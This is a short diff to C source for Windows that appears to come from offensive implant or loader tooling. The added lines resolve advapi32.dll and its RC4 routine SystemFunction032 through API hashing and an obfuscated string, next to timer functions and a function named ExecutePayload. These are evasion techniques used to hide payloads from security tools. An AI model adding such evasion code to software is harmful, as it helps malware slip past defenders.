@@ -45,6 +45,14 @@ static void InitializeApiTable() {
 
     g_ApiTable.CreateWaitableTimerW = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_CreateWaitableTimerW);
     g_ApiTable.SetWaitableTimer = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_SetWaitableTimer);
+    
+    PVOID hAdvapi32 = GetModuleBaseByHash(HASH_ADVAPI32);
+    if (!hAdvapi32) {
+        typedef HMODULE (WINAPI *LoadLibraryW_t)(LPCWSTR);
+        LoadLibraryW_t pLoadLibraryW = (LoadLibraryW_t)ResolveApiByHash(GetModuleBaseByHash(HASH_KERNEL32), HASH_LoadLibraryW);
+        hAdvapi32 = pLoadLibraryW(STOBFS_W(L"advapi32.dll"));
+    }
+    g_ApiTable.SystemFunction032 = (ULONG_PTR)ResolveApiByHash(hAdvapi32, HASH_SystemFunction032);
 }
 
 static void ExecutePayload(PVOID pTargetAddr, SIZE_T targetSize) {
